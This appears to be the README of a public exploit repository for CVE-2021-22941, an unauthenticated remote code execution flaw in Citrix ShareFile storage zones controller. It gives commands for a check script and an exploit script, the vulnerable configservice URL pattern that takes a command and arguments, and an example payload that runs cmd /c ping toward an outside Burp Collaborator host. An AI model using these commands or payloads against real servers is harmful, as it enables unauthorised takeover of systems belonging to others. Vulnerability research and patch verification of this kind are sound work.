# CVE-2021-22941 Citrix Sharefile 
Improper Access Control in Citrix ShareFile storage zones controller before 5.11.20 may allow an unauthenticated attacker to remotely compromise the storage zones controller.
# Use
### Check vulnerable
```
python3 check.py -u http://127.0.0.1
```
### Exploit
```
python3 exploit.py -u http://127.0.0.1
```
RCE: Going to http://127.0.0.1/configservice/Home/Error?0={cmd}?1={agrs}
Example:
http://127.0.0.1/configservice/Home/Error?0=cmd?1=/c+ping+-n+5+ajxfqfcjf19sm5popcdh8au6sxynmc.burpcollaborator.net
# Reference
- https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html
- https://github.com/hoavt184/CVE-2021-22941